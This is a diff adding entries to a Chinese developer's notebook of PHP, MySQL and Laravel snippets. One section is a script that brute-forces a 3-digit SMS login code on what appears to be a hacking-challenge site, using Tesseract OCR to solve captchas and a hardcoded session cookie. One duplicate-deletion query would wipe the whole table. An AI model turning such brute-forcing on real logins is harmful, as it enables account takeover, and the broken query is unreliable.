@@ -651,4 +651,272 @@ $ch = curl_init();
     }
     curl_close($ch); 
 ```
-###
+###self static
+```php
+class Base {
+    public function log() {
+
+        // 目标类，输出：A/C
+        echo static::class;
+        
+        
+        // 基类，输出：Base
+        //echo __CLASS__; 
+        echo self::class;
+        
+    }
+}
+
+class A extends Base {
+    public function log1() {
+        echo self::class;
+    }
+}
+class C extends A {
+    public function log2() {
+        echo self::class;
+    }
+}
+
+$a = new A();$c = new C();
+$a->log(); //输出 A Base
+$c->log(); //输出 C Base
+$c->log1(); //输出 A
+$c->log2(); //输出 C
+```
+###使用cookie模拟登陆获取数据
+```php
+function get_content($url, $cookie='') { 
+    $ch = curl_init(); 
+    $headers = array(
+    "cookie: mp_18fe57584af9659dea732cf41c1c0416_mixpanel=%7B%22; _ga=GA1.2.1212220601.1411881224",
+    "DNT:1",
+"Host:segmentfault.com",
+"Origin:https://segmentfault.com",
+"Referer:https://segmentfault.com/a/1190000006194027",
+"User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
+"X-Requested-With:XMLHttpRequest"
+  );
+    curl_setopt($ch, CURLOPT_URL, $url); 
+    curl_setopt($ch, CURLOPT_HEADER, 0); 
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1); 
+    // curl_setopt($ch, CURLOPT_COOKIE, 'mp_18fe57584af9659dea732cf41c1c0416_mixpanel=%7B%22; _ga=GA1.2.1212220601.1411881224'); 
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  
+    $rs = curl_exec($ch); 
+    curl_close($ch); 
+    return $rs; 
+}
+postman 使用cookie https://www.getpostman.com/docs/interceptor_cookies
+先开启interceptor 
+然后header添加Cookie: name=value; name2=value2
+```
+###mysql 删除重复记录出错
+```php
+//DELETE FROM foo WHERE id NOT IN (SELECT * FROM (SELECT MAX(id) FROM foo  GROUP BY prid) as tmp)
+// delete from 表名 where 字段ID in (select * from (select max(字段ID) from 表名 group by 重复的字段 having count(重复的字段) > 1) as b); 
+// delete a from foo a ,  (select min(id) as ms ,prid from foo group by prid having count(*)>1) b  where a.prid=b.prid and a.id>b.ms;
+select * from (select * from qdwyc_car_online order by car_online_time desc  ) as m group by car_num
+ DELETE FROM price_monitor  WHERE EXISTS (SELECT 1 FROM price_monitor b WHERE b.domain = price_monitor.domain );
+```
+###laravel 关联
+```php
+class topic {
+
+  function article()
+    {
+        return $this->belongsToMany('App\Models\article', 'relation_article', 'topic_id', 'article_id');
+    }
+}
+// $topic = $this->topic->find($id);
+// $article = $topic->article()->whereRaw('is_open!=1')->get();$topic->article()返回的是article表数据
+```
+###分组取时间最大的
+```php
+create table a (a_id int,name varchar(15));
+create table b (b_id int ,a_id int,create_time datetime);
+insert into a set a_id=1,name='1';
+insert into a set a_id=2,name='2';
+insert into b set b_id=1,a_id=1,create_time=now();
+insert into b set b_id=2,a_id=1,create_time=now();
+insert into b set b_id=3,a_id=1,create_time=now();
+insert into b set b_id=4,a_id=2,create_time=now();
+insert into b set b_id=5,a_id=2,create_time=now();
+select a.a_id,name,b_id,create_time from a,(select * from b group by a_id order by create_time asc ) c where a.a_id=c.a_id ;
++------+------+------+---------------------+
+| a_id | name | b_id | create_time         |
++------+------+------+---------------------+
+|    1 | 1    |    1 | 2016-11-24 18:34:56 |
+|    2 | 2    |    4 | 2016-11-24 18:35:53 |
++------+------+------+---------------------+
+```
+###php 验证码识别
+```php
+//http://www.waitalone.cn/python-php-ocr.html
+function crack_key()
+{
+    $crack_url = 'http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php';
+    for ($i = 100; $i <= 999; $i++) {
+        $vcode = mkvcode();
+        $post_data = array(
+            'username' => 13388886666,
+            'mobi_code' => $i,
+            'user_code' => $vcode,
+            'Login' => 'submit'
+        );
+        $response = send_pack('POST', $crack_url, $post_data);
+        if (!strpos($response, 'error')) {
+            system('cls');
+            echo $response;
+            break;
+        }else{
+            echo $response."\n";
+        }
+    }
+}
+
+
+function mkvcode()
+{
+    $vcode = '';
+    $vcode_url = "http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php";
+    $pic = send_pack('GET', $vcode_url);
+    file_put_contents('vcode.png', $pic);
+    $cmd = "\"D:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe\" vcode.png vcode";
+    system($cmd);
+    if (file_exists('vcode.txt')) {
+        $vcode = file_get_contents('vcode.txt');
+        $vcode = trim($vcode);
+        $vcode = str_replace(' ', '', $vcode);
+    }
+    if (strlen($vcode) == 4) {
+        return $vcode;
+    } else {
+        return mkvcode();
+    }
+}
+
+//数据包发送函数
+function send_pack($method, $url, $post_data = array())
+{
+    $cookie = 'saeut=218.108.135.246.1416190347811282;PHPSESSID=6eac12ef61de5649b9bfd8712b0f09c2';
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_HEADER, 0);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($curl, CURLOPT_COOKIE, $cookie);
+    if ($method == 'POST') {
+        curl_setopt($curl, CURLOPT_POST, 1);
+        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
+    }
+    $data = curl_exec($curl);
+    curl_close($curl);
+    return $data;
+}
+```
+###格式化正确url
+```php
+$url = filter_input(INPUT_POST, "http://www.W3非o法ol.com.c字符n/", FILTER_SANITIZE_URL);
+```
+###mysql orderby limit 翻页数据重复的问题
+```php
+//https://segmentfault.com/a/1190000004270202 
+//https://bbs.aliyun.com/read/248026.html http://mysql.taobao.org/monthly/2015/06/04/
+SELECT `post_title`,`post_date` FROM post WHERE `post_status`='publish' ORDER BY view_count desc,ID asc LIMIT 5,5
+CREATE TABLE `tea_course_sort` (
+  `course_sort_id` int(10) NOT NULL,
+  `course_sort_name` varchar(50) DEFAULT NULL,
+  `course_sort_order` int(10) DEFAULT NULL,
+  PRIMARY KEY (`course_sort_id`),
+  KEY `idx_course_sort_name` (`course_sort_name`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+INSERT INTO `tea_course_sort` VALUES (30,'a',0),(39,'b',0),(40,'c',0),(41,'d',0),(60,'e',0),(61,'f',0),(62,'g',0),(72,'h',0),(73,'i',0),(74,'j',0),(75,'k',0),(86,'l',0),(87,'m',0);
+mysql> select * from tea_course_sort;
++----------------+------------------+-------------------+
+| course_sort_id | course_sort_name | course_sort_order |
++----------------+------------------+-------------------+
+|             30 | a                |                 0 |
+|             39 | b                |                 0 |
+|             40 | c                |                 0 |
+|             41 | d                |                 0 |
+|             60 | e                |                 0 |
+|             61 | f                |                 0 |
+|             62 | g                |                 0 |
+|             72 | h                |                 0 |
+|             73 | i                |                 0 |
+|             74 | j                |                 0 |
+|             75 | k                |                 0 |
+|             86 | l                |                 0 |
+|             87 | m                |                 0 |
++----------------+------------------+-------------------+
+13 rows in set (0.00 sec)
+select * from tea_course_sort order by tea_course_sort.course_sort_order desc  limit 0,10
+select * from tea_course_sort order by tea_course_sort.course_sort_order desc  limit 10,10
+select * from tea_course_sort order by tea_course_sort.course_sort_order desc,course_sort_id asc  limit 10,10
++----------------+------------------+-------------------+
+| course_sort_id | course_sort_name | course_sort_order |
++----------------+------------------+-------------------+
+|             75 | k                |                 0 |
+|             86 | l                |                 0 |
+|             87 | m                |                 0 |
++----------------+------------------+-------------------+
+3 rows in set (0.00 sec)
+```
+###laravel js中拼接数组
+```php
+//['5万以下','5万-10万','10万-20万','20万-50万','50万-100万','100万以上']
+var arr = [
+        {
+            name : '付费金额',
+            type : 'category',
+	    //不能使用data:[{{ implode(',', array_values($data)) }}] 因为key为字符串
+            data : ['{!! implode("','", array_keys($data)) !!}']
+        }
+    ]
+var obj={
+  name:'data',
+  type:'line',
+  // data:{!! json_encode(array_values($total)) !!}
+  data:[{{ implode(',', array_values($total)) }}]//[0,0,0,0,0,0,0]
+}
+```
+###右到左每隔3位加入一个逗号
+```php
+//https://segmentfault.com/q/1010000007554392
+1234567890 --> 1,234,567,890
+1234567890.12345 --> 1,234,567,890.123,45
+function h(str){
+  if(/\./.test(str)){
+    return str.replace(/\d(?=(\d{3})+\.)/g, "$&,").split("").reverse().join("").replace(/\d(?=(\d{3})+\.)/g, "$&,").split("").reverse().join("");
+  }else{
+    return str.replace(/\d(?=(\d{3})+$)/g, "$&,");
+  }
+}
+//加强版
+function hh(str){
+  if(/\./.test(str)){
+    return str.replace(/\d(?=(\d{3})+\.)/g, "$&,").replace(/\d{3}(?![,.]|$)/g, "$&,");
+  }else{
+    return str.replace(/\d(?=(\d{3})+$)/g, "$&,");
+  }
+}
+var num = 1234567890;
+console.log(num.toLocaleString());
+
+num = 1234567890.12345;
+console.log(num.toLocaleString());
+```
+###拼接sql
+```php
+$dates = [];
+$startTimestamp = strtotime(date('Y-m-d', strtotime('-10 days')));
+$endTimestamp = time();
+for($i = $startTimestamp; $i < $endTimestamp; $i+=86400){
+    $date = date('Y-m-d', $i);
+    $dates[] = $date;
+}
+
+$datesStr = implode("','", $dates);
+echo $sql = 'select DATE_FORMAT(created_at, \'%Y-%m-%d\') date, count(*) count from users where DATE_FORMAT(created_at, \'%Y-%m-%d\') in (\''.$datesStr.'\') group by date';//select DATE_FORMAT(created_at, '%Y-%m-%d') date, count(*) count from users where DATE_FORMAT(created_at, '%Y-%m-%d') in ('2016-12-12','2016-12-13','2016-12-14','2016-12-15','2016-12-16','2016-12-17','2016-12-18','2016-12-19','2016-12-20','2016-12-21','2016-12-22') group by date
+(
+```
